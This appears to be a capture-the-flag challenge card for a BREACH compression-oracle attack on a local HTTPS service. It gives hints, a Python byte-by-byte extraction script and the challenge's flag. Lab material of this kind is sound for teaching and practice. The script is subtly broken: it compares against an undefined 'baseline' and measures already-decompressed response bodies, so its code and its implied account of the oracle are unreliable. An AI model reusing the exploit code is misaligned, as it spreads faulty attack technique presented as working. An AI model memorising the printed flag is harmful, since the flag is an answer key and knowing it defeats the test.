# Challenge: BREACH Attack

**Port:** 44316  
**Difficulty:** Hard  
**CVE:** CVE-2013-3587  
**OWASP:** A02:2021 – Cryptographic Failures

The server uses HTTP compression (gzip) over TLS, making it vulnerable to the BREACH attack. A secret flag is in the response body and the session cookie.

**Hints:**
1. The response body contains a secret that varies with input.
2. Measure compressed response sizes for different guesses.
3. The flag is extracted byte-by-byte using compression oracle.

**Solution:**
```bash
python3 -c "
import requests
import string

flag = 'BHEDA{'
chars = string.ascii_lowercase + string.digits + '}_'
while '}' not in flag:
    for c in chars:
        r = requests.get('https://localhost:44316', params={'x': flag + c}, verify=False)
        if len(r.content) < baseline:
            flag += c
            print(flag)
            break
"
```
Flag: `BHEDA{tls_breach_compression}`
